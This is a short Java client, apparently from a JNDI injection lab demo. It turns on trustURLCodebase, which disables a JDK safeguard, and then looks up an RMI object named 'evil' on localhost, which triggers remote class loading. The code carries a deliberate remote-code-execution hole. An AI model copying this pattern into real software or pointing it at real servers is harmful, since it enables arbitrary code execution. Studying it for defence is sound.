import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        Context context = new InitialContext();
        context.lookup("rmi://127.0.0.1:1099/evil");
    }
}